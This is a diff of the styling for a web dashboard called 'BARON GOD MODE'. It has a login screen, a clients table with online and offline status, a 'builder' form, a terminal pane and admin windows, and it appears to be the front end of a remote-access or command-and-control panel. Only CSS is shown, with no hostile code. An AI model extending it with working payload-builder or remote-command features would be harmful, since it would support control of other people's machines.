@@ -1,1120 +1,1135 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BARON · SOVEREIGN EDITION</title>
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
-<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-<style>
-  :root {
-    --gold: #D4AF37; 
-    --gold-dim: color-mix(in srgb, var(--gold) 18%, transparent);
-    --gold-glow: color-mix(in srgb, var(--gold) 35%, transparent);
-    --bg0: #020205; --bg1: rgba(5,5,10,.80); --bg2: rgba(10,10,18,.7);
-    --surface: rgba(12,12,20,.6); --border: color-mix(in srgb, var(--gold) 15%, transparent);
-    --text: #ffffff; --text-dim: rgba(255,255,255,.6);
-    --green: #2de076; --red: #ff4a6b; --blue: #5b9fff;
-    --mono: 'JetBrains Mono', monospace; --sans: 'Outfit', sans-serif;
-    --radius: 20px; --blur: 40px; /* Увеличен blur для сильного эффекта матового стекла */
-    --transition-slow: all 0.7s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  
-  /* Theming Override from LocalStorage */
-  :root[data-theme="sapphire"] { --gold: #2f80ed; }
-  :root[data-theme="emerald"] { --gold: #2ed573; }
-  :root[data-theme="amethyst"] { --gold: #9b59b6; }
-  :root[data-theme="ruby"] { --gold: #ff4757; }
-  *{margin:0;padding:0;box-sizing:border-box}
-  html,body{height:100%;overflow:hidden;font-family:var(--sans);background:var(--bg0);color:var(--text)}
-  ::-webkit-scrollbar{width:4px} ::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BARON GOD MODE — SOVEREIGN OS</title>
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <!-- Core Libraries -->
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
 
-  /* ─── Liquid Mesh Background ─── */
-  .canvas {
-    position: fixed; inset: 0; z-index: 0;
-    background: var(--bg0);
-    overflow: hidden;
-  }
-  .mesh-blob {
-    position: absolute;
-    filter: blur(120px);
-    border-radius: 50%;
-    opacity: 0.6;
-    animation: drift 20s infinite alternate cubic-bezier(0.4, 0, 0.2, 1);
-    mix-blend-mode: screen;
-  }
-  @keyframes drift {
-    0%   { transform: translate(0, 0) scale(1) rotate(0deg); }
-    50%  { transform: translate(15vw, 15vh) scale(1.1) rotate(180deg); }
-    100% { transform: translate(-10vw, -15vh) scale(0.9) rotate(360deg); }
-  }
-  .blob-1 {
-    width: 60vw; height: 60vw;
-    background: radial-gradient(circle, var(--gold-glow), transparent 70%);
-    top: -20vh; left: -20vw;
-    animation-duration: 25s;
-  }
-  .blob-2 {
-    width: 50vw; height: 50vw;
-    background: radial-gradient(circle, rgba(91,159,255,0.2), transparent 70%);
-    bottom: -20vh; right: -10vw;
-    animation-duration: 30s;
-    animation-delay: -5s;
-  }
-  .blob-3 {
-    width: 40vw; height: 40vw;
-    background: radial-gradient(circle, rgba(255,74,107,0.1), transparent 70%);
-    top: 30vh; left: 40vw;
-    animation-duration: 22s;
-    animation-delay: -10s;
-  }
-  .glass-overlay {
-    position: absolute; inset: 0;
-    backdrop-filter: blur(80px) saturate(180%);
-    z-index: 1;
-  }
+    <style>
+        :root {
+            /* Base Theme - God Mode Gold */
+            --accent: #D4AF37;
+            --accent-glow: rgba(212, 175, 55, 0.4);
+            --bg-void: #030305;
+            --glass-bg: rgba(12, 12, 20, 0.45);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --text-main: #ffffff;
+            --text-muted: rgba(255, 255, 255, 0.5);
+            
+            /* UI Metrics */
+            --blur-heavy: 40px;
+            --blur-light: 15px;
+            --radius-lg: 24px;
+            --radius-md: 16px;
+            --font-sans: 'Outfit', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            
+            /* Status Colors */
+            --danger: #ff3366;
+            --success: #00e676;
+            --warning: #ffb300;
+        }
 
-  /* ─── Login ─── */
-  #login{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;transition:opacity .7s ease}
-  .login-wrap{width:400px;animation:fadeUp .6s ease}
-  .login-card{background:var(--bg1);backdrop-filter:blur(var(--blur));border:1px solid var(--border);border-radius:24px;padding:48px 40px;text-align:center;
-    box-shadow:0 0 60px rgba(212,175,55,.05),0 30px 60px rgba(0,0,0,.6)}
-  .login-logo{font-size:2.6rem;font-weight:900;letter-spacing:10px;
-    background:linear-gradient(135deg,#fff 30%,var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
-  .login-sub{font-size:.7rem;letter-spacing:4px;color:var(--gold);opacity:.7;text-transform:uppercase;margin-bottom:36px}
-  .inp{width:100%;padding:14px 18px;margin:8px 0;background:rgba(255,255,255,.04);border:1px solid var(--border);
-    border-radius:12px;color:var(--text);font-size:.95rem;font-family:var(--sans);outline:none;transition:.3s}
-  .inp:focus{border-color:var(--gold);box-shadow:0 0 0 3px var(--gold-dim)}
-  .btn-login{width:100%;padding:15px;margin-top:20px;background:linear-gradient(135deg,var(--gold),#b8871e);
-    color:#000;font-weight:800;font-size:1rem;letter-spacing:2px;border:none;border-radius:12px;cursor:pointer;transition:.3s;font-family:var(--sans)}
-  .btn-login:hover{transform:translateY(-2px);box-shadow:0 8px 30px var(--gold-glow)}
-  .err{color:var(--red);font-size:.85rem;margin-top:14px;min-height:20px}
+        /* Customizable Themes via JS */
+        [data-theme="sapphire"] { --accent: #2f80ed; --accent-glow: rgba(47, 128, 237, 0.4); }
+        [data-theme="ruby"]     { --accent: #ff4757; --accent-glow: rgba(255, 71, 87, 0.4); }
+        [data-theme="emerald"]  { --accent: #2ed573; --accent-glow: rgba(46, 213, 115, 0.4); }
+        [data-theme="amethyst"] { --accent: #9b59b6; --accent-glow: rgba(155, 89, 182, 0.4); }
 
-  /* ─── Layout ─── */
-  #shell{display:none;grid-template-columns:260px 1fr;height:100vh;position:relative;z-index:1}
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        
+        body, html {
+            width: 100vw; height: 100vh;
+            overflow: hidden;
+            background-color: var(--bg-void);
+            color: var(--text-main);
+            font-family: var(--font-sans);
+        }
 
-  /* ─── Sidebar ─── */
-  .sidebar{background:rgba(6,6,14,.95);backdrop-filter:blur(40px);border-right:1px solid var(--border);
-    display:flex;flex-direction:column;gap:0;padding:0;overflow:hidden}
-  .sbar-top{padding:32px 24px 24px;border-bottom:1px solid var(--border)}
-  .sbar-logo{font-size:1.7rem;font-weight:900;letter-spacing:8px;
-    background:linear-gradient(135deg,#fff,var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-  .sbar-ver{font-size:.65rem;color:var(--gold);letter-spacing:2px;opacity:.6;margin-top:2px}
-  .sbar-status{display:flex;align-items:center;gap:8px;margin-top:16px;
-    font-size:.75rem;color:var(--text-dim);font-family:var(--mono)}
-  .dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
+        /* Scrollbars */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
 
-  .nav{flex:1;padding:16px 12px;overflow-y:auto;display:flex;flex-direction:column;gap:4px}
-  .nav-label{font-size:.6rem;letter-spacing:3px;color:var(--text-dim);padding:12px 12px 6px;text-transform:uppercase}
-  .nav-item{padding:11px 14px;border-radius:10px;cursor:pointer;transition:.25s;
-    display:flex;align-items:center;gap:12px;color:var(--text-dim);font-size:.88rem;border:1px solid transparent}
-  .nav-item svg{width:16px;height:16px;flex-shrink:0}
-  .nav-item:hover{background:var(--gold-dim);color:var(--text);border-color:var(--border)}
-  .nav-item.active{background:var(--gold-dim);color:var(--gold);border-color:var(--gold-glow);
-    box-shadow:inset 0 0 20px var(--gold-dim),0 0 15px rgba(212,175,55,.05)}
+        /* -----------------------------------------------------
+           3D WebGL Background Layer
+        ----------------------------------------------------- */
+        #canvas-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: 0;
+            pointer-events: none;
+        }
 
-  .sbar-bot{padding:16px 12px;border-top:1px solid var(--border)}
-  .usr-card{padding:12px 14px;border-radius:10px;background:var(--gold-dim);border:1px solid var(--border);
-    display:flex;align-items:center;gap:10px}
-  .usr-av{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--gold),#8b6914);
-    display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.8rem;color:#000}
-  .usr-name{font-size:.85rem;font-weight:600}
-  .usr-role{font-size:.7rem;color:var(--gold);opacity:.8}
-  .btn-logout{width:100%;margin-top:8px;padding:9px;background:rgba(255,74,107,.1);border:1px solid rgba(255,74,107,.2);
-    color:var(--red);border-radius:8px;cursor:pointer;font-size:.8rem;transition:.2s;font-family:var(--sans)}
-  .btn-logout:hover{background:rgba(255,74,107,.2)}
+        /* Ambient Lighting / Mesh overlay */
+        .ambient-mesh {
+            position: fixed; inset: 0; z-index: 1;
+            background: radial-gradient(circle at 50% 50%, transparent 20%, var(--bg-void) 120%);
+            mix-blend-mode: multiply;
+            pointer-events: none;
+        }
 
-  /* ─── Main ─── */
-  .main{display:flex;flex-direction:column;overflow:hidden}
-  /* ─── Sovereign Island (Dynamic Top Bar) ─── */
-  .sovereign-wrapper {
-    position: absolute; top: 16px; left: 0; right: 0;
-    display: flex; justify-content: center; z-index: 50;
-    pointer-events: none;
-  }
-  .sovereign-island {
-    background: #000;
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 40px;
-    height: 48px; min-width: 260px; padding: 0 16px;
-    display: flex; align-items: center; justify-content: space-between;
-    transition: var(--transition-slow);
-    pointer-events: auto;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.8), inset 0 0 15px rgba(255,255,255,0.02);
-    overflow: hidden; cursor: pointer;
-  }
-  .sovereign-island:hover { transform: scale(1.02); }
-  .sovereign-island.expanded { 
-    height: 64px; min-width: 450px; border-radius: 32px; 
-    background: rgba(10,10,18,0.95); backdrop-filter: blur(20px); 
-    border-color: var(--gold-dim); 
-  }
-  
-  .isl-left { display: flex; align-items: center; gap: 12px; }
-  .isl-center { 
-    flex: 1; text-align: center; overflow: hidden; white-space: nowrap; 
-    color: var(--gold); font-size: 0.8rem; font-weight: 500; 
-    opacity: 0; transition: 0.4s; padding: 0 10px;
-  }
-  .sovereign-island.expanded .isl-center { opacity: 1; }
-  .isl-right { display: flex; align-items: center; gap: 12px; }
-  
-  .theme-picker { display: flex; gap: 6px; }
-  .theme-dot { 
-    width: 14px; height: 14px; border-radius: 50%; cursor: pointer; 
-    transition: 0.2s; border: 1px solid rgba(255,255,255,0.1); 
-  }
-  .theme-dot:hover { transform: scale(1.3); }
+        /* -----------------------------------------------------
+           Glassmorphism Toolkit
+        ----------------------------------------------------- */
+        .glass-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(var(--blur-heavy));
+            -webkit-backdrop-filter: blur(var(--blur-heavy));
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-lg);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1);
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
 
-  .pg-title{font-size:1.1rem;font-weight:700}
-  .time-chip{font-family:var(--mono);font-size:.75rem;color:var(--text);
-    background:rgba(255,255,255,0.05);padding:4px 10px;border-radius:20px}
+        /* -----------------------------------------------------
+           Auth Screen
+        ----------------------------------------------------- */
+        #auth-screen {
+            position: fixed; inset: 0; z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
+            background: var(--bg-void);
+            transition: opacity 0.8s ease, visibility 0.8s;
+        }
+        .auth-card {
+            width: 440px; padding: 50px; text-align: center;
+            position: relative; overflow: hidden;
+            animation: floatIn 1.2s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        @keyframes floatIn {
+            0% { opacity: 0; transform: translateY(40px) scale(0.95); filter: blur(10px); }
+            100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        }
+        .auth-logo {
+            font-size: 3rem; font-weight: 900; letter-spacing: 12px;
+            background: linear-gradient(135deg, #fff 20%, var(--accent) 80%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
+        .auth-sub {
+            font-size: 0.75rem; letter-spacing: 6px; color: var(--accent);
+            text-transform: uppercase; margin-bottom: 40px; opacity: 0.8;
+        }
+        .input-group { position: relative; margin-bottom: 20px; }
+        .input-group i {
+            position: absolute; left: 20px; top: 50%; transform: translateY(-50%);
+            color: var(--text-muted); transition: 0.3s;
+        }
+        .glass-input {
+            width: 100%; padding: 18px 20px 18px 50px;
+            background: rgba(0,0,0,0.2); border: 1px solid var(--glass-border);
+            border-radius: var(--radius-md); color: #fff;
+            font-family: var(--font-sans); font-size: 1rem; outline: none;
+            transition: 0.3s;
+        }
+        .glass-input:focus {
+            border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow);
+            background: rgba(0,0,0,0.4);
+        }
+        .glass-input:focus + i { color: var(--accent); }
+        .auth-btn {
+            width: 100%; padding: 18px; margin-top: 10px;
+            background: var(--accent); color: #000;
+            font-family: var(--font-sans); font-weight: 800; font-size: 1.1rem;
+            letter-spacing: 2px; border: none; border-radius: var(--radius-md);
+            cursor: pointer; transition: 0.4s; position: relative; overflow: hidden;
+        }
+        .auth-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px var(--accent-glow);
+        }
 
-  .content{flex:1;overflow-y:auto;padding:32px 36px;display:flex;flex-direction:column;gap:32px}
+        /* -----------------------------------------------------
+           OS Workspace (Desktop)
+        ----------------------------------------------------- */
+        #workspace {
+            position: fixed; inset: 0; z-index: 10;
+            display: none; opacity: 0;
+            transition: opacity 1s ease;
+        }
 
-  /* ─── Liquid Glass Cards ─── */
-  .card{
-    background: linear-gradient(135deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0) 100%), var(--surface);
-    backdrop-filter: blur(var(--blur)) saturate(180%);
-    border: 1px solid rgba(255,255,255,0.06); border-top: 1px solid rgba(255,255,255,0.15);
-    border-radius: var(--radius); transition: var(--transition-slow);
-    box-shadow: 0 16px 40px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
-  }
-  .card:hover{
-    border-color: rgba(212,175,55,.2);
-    box-shadow: 0 20px 50px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.2), 0 0 40px var(--gold-dim);
-    transform: translateY(-2px);
-  }
-  .card-head{padding:20px 24px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:space-between}
-  .card-title{font-size:.9rem;font-weight:600;letter-spacing:.5px; text-shadow: 0 2px 10px rgba(0,0,0,0.5);}
-  .card-badge{font-size:.7rem;padding:4px 10px;border-radius:20px;font-family:var(--mono)}
-  .card-body{padding:24px}
+        /* -----------------------------------------------------
+           Dynamic Island (Top Notch)
+        ----------------------------------------------------- */
+        .dynamic-island {
+            position: absolute; top: 15px; left: 50%; transform: translateX(-50%);
+            background: #000; border-radius: 40px;
+            height: 40px; width: 200px;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05);
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 1000; overflow: hidden; cursor: pointer;
+        }
+        .dynamic-island:hover { width: 300px; }
+        .island-content {
+            display: flex; align-items: center; gap: 10px;
+            font-size: 0.85rem; font-weight: 500; font-family: var(--font-mono);
+        }
+        .island-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--success);
+            box-shadow: 0 0 10px var(--success);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-  /* ─── Stats ─── */
-  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:24px}
-  .stat{
-    padding:24px;border-radius:var(--radius);
-    background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0) 100%), var(--surface);
-    backdrop-filter: blur(40px) saturate(200%);
-    border: 1px solid rgba(255,255,255,0.08); border-top: 1px solid rgba(255,255,255,0.18);
-    position:relative;overflow:hidden;transition:var(--transition-slow);
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
-    cursor: grab;
-  }
-  .stat:active { cursor: grabbing; transform: scale(0.96); }
-  .stat:hover{
-    transform:translateY(-6px) scale(1.02);
-    border-color:rgba(212,175,55,.4);
-    box-shadow: 0 20px 40px rgba(0,0,0,0.7), 0 0 30px var(--gold-dim);
-  }
-  .stat::before{content:'';position:absolute;top:-40px;right:-40px;width:120px;height:120px;border-radius:50%;
-    background:radial-gradient(circle, var(--gold-glow),transparent); opacity: 0.5; transition: 0.8s;}
-  .stat:hover::before { transform: scale(1.5); opacity: 1; }
-  .stat-label{font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--gold);margin-bottom:10px; font-weight:600;}
-  .stat-val{font-size:3rem;font-weight:800;line-height:1;color:#fff; text-shadow: 0 4px 20px rgba(255,255,255,0.2);}
-  .stat-hint{font-size:.75rem;color:var(--text-dim);margin-top:8px;font-family:var(--mono)}
+        /* Expanded Island State */
+        .dynamic-island.expanded {
+            width: 400px; height: 120px; border-radius: 24px;
+            align-items: flex-start; padding: 20px;
+        }
 
-  /* ─── Table ─── */
-  .tbl-wrap{overflow-x:auto}
-  table{width:100%;border-collapse:collapse}
-  th{padding:12px 16px;text-align:left;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--gold);border-bottom:1px solid var(--border)}
-  td{padding:16px 16px;border-bottom:1px solid rgba(255,255,255,.04);font-size:.85rem;vertical-align:middle}
-  tr:last-child td{border:none}
-  tr:hover td{background:rgba(255,255,255,.02)}
-  .pill{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;font-size:.72rem;font-family:var(--mono)}
-  .pill-green{background:rgba(45,224,118,.12);color:var(--green);border:1px solid rgba(45,224,118,.2)}
-  .pill-red{background:rgba(255,74,107,.12);color:var(--red);border:1px solid rgba(255,74,107,.2)}
-  .pill-dot{width:5px;height:5px;border-radius:50%;background:currentColor}
-  .cid{font-family:var(--mono);font-size:.75rem;color:var(--text-dim)}
+        /* -----------------------------------------------------
+           Dock (Left Sidebar)
+        ----------------------------------------------------- */
+        .dock {
+            position: absolute; left: 20px; top: 50%; transform: translateY(-50%);
+            width: 80px; padding: 20px 0;
+            display: flex; flex-direction: column; align-items: center; gap: 20px;
+            z-index: 100;
+        }
+        .dock-item {
+            width: 50px; height: 50px; border-radius: 16px;
+            background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.2rem; color: var(--text-muted);
+            cursor: pointer; transition: 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+        }
+        .dock-item:hover, .dock-item.active {
+            background: var(--accent-glow); color: #fff;
+            border-color: var(--accent); transform: scale(1.1);
+        }
+        .dock-item[data-tooltip]::after {
+            content: attr(data-tooltip);
+            position: absolute; left: 70px;
+            background: rgba(0,0,0,0.8); padding: 6px 12px; border-radius: 8px;
+            font-size: 0.8rem; pointer-events: none; opacity: 0; transform: translateX(-10px);
+            transition: 0.3s; white-space: nowrap; border: 1px solid var(--glass-border);
+        }
+        .dock-item:hover::after { opacity: 1; transform: translateX(0); }
 
-  /* ─── Btn & Inputs (Liquid Glass) ─── */
-  .btn{
-    padding:10px 22px;border-radius:12px;cursor:pointer;font-size:.85rem;font-family:var(--sans);
-    border:1px solid transparent;transition:var(--transition-slow);font-weight:600;
-    backdrop-filter: blur(10px);
-  }
-  .btn-gold{
-    background: linear-gradient(135deg, var(--gold), color-mix(in srgb, var(--gold) 60%, black));
-    color:#000;border:none; box-shadow: 0 4px 15px var(--gold-dim), inset 0 1px 0 rgba(255,255,255,0.4);
-  }
-  .btn-gold:hover{
-    box-shadow:0 8px 25px var(--gold-glow), inset 0 1px 0 rgba(255,255,255,0.6);
-    transform:translateY(-2px) scale(1.03);
-  }
-  .btn-gold:active{ transform: scale(0.95); }
-  
-  .btn-outline{background:rgba(255,255,255,0.03);border: 1px solid rgba(255,255,255,0.1);color:var(--text);}
-  .btn-outline:hover{background:rgba(255,255,255,0.08);border-color:var(--gold);color:#fff; transform: translateY(-2px);}
-  .btn-red{background:rgba(255,74,107,.15);border-color:rgba(255,74,107,.3);color:var(--red)}
-  .btn-red:hover{background:rgba(255,74,107,.3); box-shadow: 0 0 20px rgba(255,74,107, 0.4);}
-  .btn-sm{padding:6px 14px;font-size:.75rem}
+        /* -----------------------------------------------------
+           Spatial Windows (Window Manager)
+        ----------------------------------------------------- */
+        .os-window {
+            position: absolute;
+            background: var(--glass-bg); backdrop-filter: blur(var(--blur-heavy));
+            border: 1px solid var(--glass-border); border-radius: var(--radius-md);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.02) inset;
+            display: flex; flex-direction: column; overflow: hidden;
+            transition: transform 0.2s, opacity 0.2s, box-shadow 0.2s;
+            transform-origin: center center;
+            animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.9) translateY(20px); filter: blur(5px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
+        }
+        .os-window.focus {
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6), 0 0 0 1px var(--accent) inset;
+            z-index: 500 !important;
+        }
+        .win-header {
+            height: 48px; background: rgba(0,0,0,0.4);
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 20px; cursor: move; border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .win-title { font-weight: 600; font-size: 0.9rem; letter-spacing: 1px; display: flex; align-items: center; gap: 10px; }
+        .win-controls { display: flex; gap: 8px; }
+        .win-btn {
+            width: 14px; height: 14px; border-radius: 50%; border: none; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; opacity: 0.5; transition: 0.2s;
+        }
+        .win-btn:hover { opacity: 1; transform: scale(1.1); }
+        .win-close { background: var(--danger); }
+        .win-max { background: var(--success); }
+        .win-min { background: var(--warning); }
+        .win-body { flex: 1; overflow: auto; position: relative; padding: 20px; }
 
-  /* ─── Terminal ─── */
-  .terminal{background:#000;border:1px solid var(--border);border-radius:10px;
-    font-family:var(--mono);font-size:.78rem;overflow:hidden}
-  .term-bar{padding:10px 16px;background:rgba(255,255,255,.04);border-bottom:1px solid var(--border);
-    display:flex;align-items:center;gap:8px}
-  .term-dot{width:10px;height:10px;border-radius:50%}
+        /* Window Specific Overrides */
+        #win-clients { width: 900px; height: 600px; top: 100px; left: 150px; }
+        #win-builder { width: 600px; height: 750px; top: 80px; left: 400px; display: none; }
+        #win-logs    { width: 500px; height: 800px; top: 50px; right: 50px; left: auto; display: none; }
+        #win-settings{ width: 400px; height: 500px; top: 200px; left: 300px; display: none; }
+        #win-admin   { width: 600px; height: 450px; top: 150px; left: 450px; display: none; }
+        #win-changelog{ width: 500px; height: 600px; top: 100px; left: 250px; display: none; }
 
-  /* ─── Context Menu ─── */
-  #ctx-menu {
-    position: fixed; z-index: 9999; background: var(--bg1); backdrop-filter: blur(var(--blur));
-    border: 1px solid var(--border); border-radius: 12px; min-width: 220px;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 15px rgba(212,175,55,0.1); display: none;
-    flex-direction: column; padding: 8px; overflow: hidden;
-  }
-  #ctx-menu.show { display: flex; animation: fadeUp .2s ease }
-  .ctx-item {
-    padding: 10px 16px; font-size: .85rem; color: var(--text); border-radius: 6px;
-    cursor: pointer; display: flex; align-items: center; gap: 8px; transition: .2s;
-  }
-  .ctx-item:hover { background: var(--gold-dim); color: var(--gold); }
-  .ctx-item.danger { color: var(--red); }
-  .ctx-item.danger:hover { background: rgba(255,74,107,.15); }
-  .ctx-divider { height: 1px; background: rgba(255,255,255,.05); margin: 6px 0; }
-  .ctx-header { padding: 8px 16px; font-size: .7rem; letter-spacing: 2px; text-transform: uppercase; color: var(--text-dim); }
+        /* -----------------------------------------------------
+           Admin Center
+        ----------------------------------------------------- */
+        .admin-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .admin-card {
+            background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05);
+            padding: 20px; border-radius: 12px; text-align: center; cursor: pointer;
+            transition: 0.3s;
+        }
+        .admin-card i { font-size: 2rem; margin-bottom: 10px; color: var(--accent); }
+        .admin-card:hover { transform: translateY(-3px); background: rgba(255,255,255,0.05); border-color: var(--accent); }
+        .admin-card.danger i { color: var(--danger); }
+        .admin-card.danger:hover { box-shadow: 0 0 20px rgba(255,51,102,0.3); border-color: var(--danger); }
 
-    display:flex;align-items:center;gap:8px}
-  .term-dot{width:10px;height:10px;border-radius:50%}
-  .term-body{padding:14px 18px;height:220px;overflow-y:auto;color:#a0f0a0;line-height:1.7}
-  .term-inp-row{display:flex;align-items:center;gap:0;padding:8px 18px;border-top:1px solid var(--border)}
-  .term-prompt{color:var(--gold);white-space:nowrap;font-family:var(--mono)}
-  .term-inp{flex:1;background:none;border:none;outline:none;color:#fff;font-family:var(--mono);font-size:.78rem;padding:0 10px}
+        /* -----------------------------------------------------
+           Changelog
+        ----------------------------------------------------- */
+        .cl-item { border-left: 2px solid var(--accent); padding-left: 15px; margin-bottom: 20px; position: relative; }
+        .cl-item::before { content: ''; position: absolute; left: -6px; top: 0; width: 10px; height: 10px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
+        .cl-version { font-size: 1.1rem; font-weight: 700; color: #fff; margin-bottom: 5px; }
+        .cl-date { font-size: 0.8rem; color: var(--text-muted); font-family: var(--font-mono); margin-bottom: 10px; }
+        .cl-list { list-style: none; padding: 0; color: rgba(255,255,255,0.8); font-size: 0.9rem; }
+        .cl-list li { margin-bottom: 5px; padding-left: 15px; position: relative; }
+        .cl-list li::before { content: '-'; position: absolute; left: 0; color: var(--text-muted); }
 
-  /* ─── Builder ─── */
-  .builder-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
-  .form-group{margin-bottom:16px}
-  .form-label{display:block;font-size:.72rem;letter-spacing:2px;color:var(--gold);text-transform:uppercase;margin-bottom:8px}
-  .form-input{width:100%;padding:11px 14px;background:rgba(255,255,255,.04);border:1px solid var(--border);
-    border-radius:8px;color:var(--text);font-size:.88rem;outline:none;transition:.25s;font-family:var(--sans)}
-  .form-input:focus{border-color:var(--gold);box-shadow:0 0 0 3px var(--gold-dim)}
-  .form-select{width:100%;padding:11px 14px;background:rgba(8,8,18,.9);border:1px solid var(--border);
-    border-radius:8px;color:var(--text);font-size:.88rem;outline:none;cursor:pointer;font-family:var(--sans)}
-  .toggle-row{display:flex;align-items:center;justify-content:space-between;
-    padding:12px 0;border-bottom:1px solid rgba(255,255,255,.05)}
-  .toggle-label{font-size:.85rem}
-  .toggle-sub{font-size:.72rem;color:var(--text-dim);margin-top:2px}
-  input[type=checkbox]{accent-color:var(--gold);width:16px;height:16px;cursor:pointer}
+        /* -----------------------------------------------------
+           Data Tables (Clients)
+        ----------------------------------------------------- */
+        .glass-table { width: 100%; border-collapse: collapse; text-align: left; }
+        .glass-table th {
+            padding: 15px; font-size: 0.8rem; color: var(--text-muted);
+            text-transform: uppercase; letter-spacing: 2px;
+            border-bottom: 1px solid var(--glass-border);
+            font-weight: 600;
+        }
+        .glass-table td {
+            padding: 16px 15px; font-size: 0.95rem; border-bottom: 1px solid rgba(255,255,255,0.03);
+            vertical-align: middle;
+        }
+        .glass-table tr { transition: 0.2s; cursor: context-menu; }
+        .glass-table tr:hover { background: rgba(255,255,255,0.03); }
+        
+        .status-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 700;
+        }
+        .status-online { background: rgba(0, 230, 118, 0.1); color: var(--success); border: 1px solid rgba(0, 230, 118, 0.2); }
+        .status-offline { background: rgba(255, 51, 102, 0.1); color: var(--danger); border: 1px solid rgba(255, 51, 102, 0.2); }
+        .status-new { background: rgba(212, 175, 55, 0.1); color: var(--accent); border: 1px solid rgba(212, 175, 55, 0.3); animation: flash 2s infinite; }
+        @keyframes flash {
+            0% { box-shadow: 0 0 0px var(--accent-glow); }
+            50% { box-shadow: 0 0 15px var(--accent-glow); }
+            100% { box-shadow: 0 0 0px var(--accent-glow); }
+        }
 
-  /* ─── Log ─── */
-  .log-entry{display:flex;gap:14px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.03);align-items:flex-start}
